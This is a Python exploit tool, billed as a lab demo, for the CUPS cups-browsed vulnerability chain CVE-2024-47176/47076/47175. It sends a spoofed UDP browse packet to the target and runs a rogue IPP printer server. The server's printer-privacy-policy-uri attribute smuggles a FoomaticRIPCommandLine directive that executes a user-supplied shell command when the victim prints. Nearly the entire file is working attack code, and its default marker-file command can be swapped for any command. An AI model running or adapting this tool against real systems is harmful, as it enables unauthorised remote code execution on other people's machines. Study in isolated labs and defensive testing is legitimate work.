
import argparse
import logging
import signal
import socket
import sys
import threading

from ippserver.server import IPPRequestHandler, IPPServer
from ippserver.constants import (
    OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
)
import ippserver.behaviour as behaviour
from ippserver.parsers import Integer, Enum, Boolean

from scapy.all import IP, UDP, Raw, send, wrpcap

logger = logging.getLogger("cups-demo")


# --------------------------------------------------------------------------- #
# Malicious printer behaviour
# --------------------------------------------------------------------------- #
class MaliciousPrinter(behaviour.StatelessPrinter):
    def __init__(self, command: str):
        self.command = command
        super(MaliciousPrinter, self).__init__()

    def printer_list_attributes(self):
        attr = {
            (SectionEnum.printer, b'printer-uri-supported', TagEnum.uri):
                [self.printer_uri],
            (SectionEnum.printer, b'uri-authentication-supported', TagEnum.keyword):
                [b'none'],
            (SectionEnum.printer, b'uri-security-supported', TagEnum.keyword):
                [b'none'],
            (SectionEnum.printer, b'printer-name', TagEnum.name_without_language):
                [b'Main Printer'],
            (SectionEnum.printer, b'printer-info', TagEnum.text_without_language):
                [b'Main Printer Info'],
            (SectionEnum.printer, b'printer-make-and-model', TagEnum.text_without_language):
                [b'HP 0.00'],
            (SectionEnum.printer, b'printer-state', TagEnum.enum):
                [Enum(3).bytes()],
            (SectionEnum.printer, b'printer-state-reasons', TagEnum.keyword):
                [b'none'],
            (SectionEnum.printer, b'ipp-versions-supported', TagEnum.keyword):
                [b'1.1'],
            (SectionEnum.printer, b'operations-supported', TagEnum.enum):
                [Enum(x).bytes() for x in (
                    OperationEnum.print_job,
                    OperationEnum.validate_job,
                    OperationEnum.cancel_job,
                    OperationEnum.get_job_attributes,
                    OperationEnum.get_printer_attributes,
                )],
            (SectionEnum.printer, b'multiple-document-jobs-supported', TagEnum.boolean):
                [Boolean(False).bytes()],
            (SectionEnum.printer, b'charset-configured', TagEnum.charset):
                [b'utf-8'],
            (SectionEnum.printer, b'charset-supported', TagEnum.charset):
                [b'utf-8'],
            (SectionEnum.printer, b'natural-language-configured', TagEnum.natural_language):
                [b'en'],
            (SectionEnum.printer, b'generated-natural-language-supported', TagEnum.natural_language):
                [b'en'],
            (SectionEnum.printer, b'document-format-default', TagEnum.mime_media_type):
                [b'application/pdf'],
            (SectionEnum.printer, b'document-format-supported', TagEnum.mime_media_type):
                [b'application/pdf'],
            (SectionEnum.printer, b'printer-is-accepting-jobs', TagEnum.boolean):
                [Boolean(True).bytes()],
            (SectionEnum.printer, b'queued-job-count', TagEnum.integer):
                [Integer(666).bytes()],
            (SectionEnum.printer, b'pdl-override-supported', TagEnum.keyword):
                [b'not-attempted'],
            (SectionEnum.printer, b'printer-up-time', TagEnum.integer):
                [Integer(self.printer_uptime()).bytes()],
            (SectionEnum.printer, b'compression-supported', TagEnum.keyword):
                [b'none'],
            # === injection point ===
            (SectionEnum.printer, b'printer-privacy-policy-uri', TagEnum.uri):
                [b'https://www.google.com/"\n*FoomaticRIPCommandLine: "'
                 + self.command.encode()
                 + b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'],
        }
        attr.update(super().minimal_attributes())
        return attr

    def handle_print_job(self, req, _psfile):
        logger.info("Target connected and sent a print job — payload was triggered.")
        return super().handle_print_job(req, _psfile)


# --------------------------------------------------------------------------- #
# Browse packet
# --------------------------------------------------------------------------- #
def build_browse_packet(target_ip: str, server_host: str, server_port: int):
    printer_type = 0x00
    printer_state = 0x03
    printer_uri = f"ipp://{server_host}:{server_port}/printers/NAME"
    printer_location = "Office HQ is very secure, nothing to see here"
    printer_info = "Printyboy is good friend of the boss, nothing to see here"

    message = (
        f'{printer_type:x} {printer_state:x} {printer_uri} '
        f'"{printer_location}" "{printer_info}"'
    ).encode("UTF-8")

    pkt = IP(dst=target_ip) / UDP(sport=631, dport=631) / Raw(load=message)
    return pkt


def send_browsed_packet(pkt, target_ip: str, target_port: int = 631,
                        pcap_path: str | None = None):
    logger.info("Sending UDP browse packet to %s:%d", target_ip, target_port)
    if pcap_path:
        wrpcap(pcap_path, [pkt])
        logger.info("Saved browse packet to %s", pcap_path)
    send(pkt, verbose=False)


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
def parse_args(argv=None):
    p = argparse.ArgumentParser(
        description="CUPS CVE-2024-47176/47076/47175 lab demo tool.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--target", required=True,
                   help="Target CUPS server IP (cups-browsed host).")
    p.add_argument("--target-port", type=int, default=631,
                   help="Target UDP port (cups-browsed listens on 631).")
    p.add_argument("--server-host", required=True,
                   help="Your local IP reachable from the target.")
    p.add_argument("--server-port", type=int, default=29999,
                   help="Port for the malicious IPP server to listen on.")
    p.add_argument("--command", default="echo 1 > /tmp/I_AM_VULNERABLE2",
                   help="Shell command to inject via FoomaticRIPCommandLine.")
    p.add_argument("--pcap", default=None,
                   help="Optional path to export the crafted browse packet as PCAP.")
    p.add_argument("-v", "--verbose", action="count", default=0,
                   help="Increase log verbosity (-v, -vv).")
    p.add_argument("--no-interactive", action="store_true",
                   help="Skip the interactive menu; start the server and send immediately.")
    return p.parse_args(argv)


def setup_logging(verbosity: int):
    level = logging.WARNING
    if verbosity == 1:
        level = logging.INFO
    elif verbosity >= 2:
        level = logging.DEBUG
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )


def run_attack(args):
    # Build the packet once so we can export it before sending.
    pkt = build_browse_packet(args.target, args.server_host, args.server_port)

    if args.pcap:
        wrpcap(args.pcap, [pkt])
        logger.info("Saved browse packet to %s", args.pcap)

    # Start the malicious IPP server.
    server = IPPServer(
        (args.server_host, args.server_port),
        IPPRequestHandler,
        MaliciousPrinter(args.command),
    )
    logger.info("Malicious IPP server listening on %s:%d",
                args.server_host, args.server_port)

    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    # Send the advertisement.
    send_browsed_packet(pkt, args.target, args.target_port, pcap_path=None)

    logger.info("Waiting for cups-browsed to fetch attributes. "
                "Trigger a print job on the target to execute the payload.")
    try:
        while server_thread.is_alive():
            server_thread.join(timeout=1.0)
    except KeyboardInterrupt:
        logger.info("Interrupted, shutting down.")
    finally:
        server.shutdown()
        logger.info("Server stopped.")


def main(argv=None):
    args = parse_args(argv)
    setup_logging(args.verbose)

    if args.no_interactive:
        run_attack(args)
        return 0

    # Interactive fallback (kept for classroom demos)
    while True:
        action = input("Command (h=help, s=send, e=exit): ").strip()
        if not action:
            continue
        c = action[0].lower()
        if c == "h":
            print("h - help | s - start server & send packet | e - exit")
        elif c == "s":
            try:
                run_attack(args)
            except Exception as e:
                logger.exception("Attack run failed: %s", e)
        elif c == "e":
            logger.info("Exiting.")
            return 0


if __name__ == "__main__":
    sys.exit(main())